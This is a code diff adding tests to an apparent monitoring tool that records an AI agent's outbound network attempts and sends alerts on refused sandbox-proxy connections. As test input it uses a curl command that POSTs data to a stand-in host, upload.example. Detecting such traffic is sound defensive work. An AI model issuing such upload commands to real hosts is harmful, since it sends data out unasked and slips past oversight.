@@ -95,6 +95,15 @@ describe('outbound attempts', () => {
     expect(event?.summary).not.toContain(body);
   });
 
+  it('shows the traced command as plain text, cut at the trace bound when long', () => {
+    const command = 'curl -X POST -d x https://upload.example/';
+    expect(outboundAttempt('Bash', bash(command), 'mr')?.summary).toBe(command);
+    const long = `curl -d '${'x'.repeat(5_000)}' https://upload.example/`;
+    const summary = outboundAttempt('Bash', bash(long), 'mr')?.summary ?? '';
+    expect(summary.endsWith('...')).toBe(true);
+    expect(summary.length).toBeLessThan(4_100);
+  });
+
   it('reports a call the runtime announces twice once, and still traces it', () => {
     const inner = { started: vi.fn(), settled: vi.fn(), interrupted: vi.fn(), finished: vi.fn() };
     const sink = vi.fn();
@@ -188,6 +197,31 @@ describe('outbound event recorder', () => {
     expect(sent).toHaveLength(2);
     expect(sent[0].text).toContain('Agent outbound attempt');
     expect(sent[1].text).toContain('Suppressed since previous alert: 1');
+  });
+
+  it('alerts a refused proxy connection with its destination, grouping tunnels in a burst', async () => {
+    vi.useFakeTimers();
+    vi.setSystemTime(0);
+    const sent: Array<{ text: string; key: string }> = [];
+    const recorder = recorderWith(sent);
+    const connection = (summary: string, sendsData: boolean | null): OutboundAttemptEvent => ({
+      time: new Date().toISOString(),
+      class: 'outbound_connect',
+      tool: 'sandbox proxy',
+      summary,
+      sendsData,
+      modelRunId: null,
+      callId: null,
+    });
+    recorder.record(connection('CONNECT upload.example:443 (http proxy)', null));
+    recorder.record(connection('CONNECT upload.example:443 (http proxy)', null));
+    recorder.record(connection('POST upload.example:80 (http proxy)', true));
+    await vi.runAllTimersAsync();
+    expect(sent).toHaveLength(2);
+    expect(sent[0].text).toContain('Agent outbound connection (refused by the sandbox proxy)');
+    expect(sent[0].text).toContain('Request: CONNECT upload.example:443 (http proxy)');
+    expect(sent[0].text).toContain('Sends data: unknown');
+    expect(sent[1].text).toContain('Sends data: yes');
   });
 
   it('records without alerting during replay', async () => {
